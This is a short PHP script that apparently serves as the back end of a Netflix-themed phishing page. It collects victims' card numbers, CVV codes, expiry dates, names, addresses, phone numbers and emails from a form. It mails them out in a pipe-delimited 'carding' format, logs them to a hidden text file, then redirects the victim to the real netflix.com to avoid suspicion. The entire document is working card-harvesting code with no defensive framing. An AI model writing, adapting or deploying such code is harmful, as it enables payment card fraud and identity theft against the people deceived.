<?php
$ip = $_SERVER['REMOTE_ADDR'];
$fname = $_POST['fname'];
$lname = $_POST['lname'];
$card = $_POST['card'];
$cvv = $_POST['cvv'];
$exp = $_POST['exp'];
$a1 = $_POST['a1'];
$city = $_POST['city'];
$state = $_POST['state'];
$zip = $_POST['zip'];
$phone = $_POST['phone'];
$email = $_POST['mailget'];
$country = $_POST['country'];

if(!empty($fname)){
$comi="";
$from_address="apache@localhost.localdomain";
$from_name="ALT";
$mesaj = "$card|$cvv|$exp|$fname $lname|$a1|$city|$state|$zip|$country|$phone|$email| ";


mail($comi, "$fname", $mesaj);
$fp = fopen("546756347564.txt","a");
fputs($fp,$mesaj);
fputs($fp,"\n");
fclose($fp);

header("Location: https://netflix.com/");
}
else {
header("Location: https://netflix.com/");
}

?>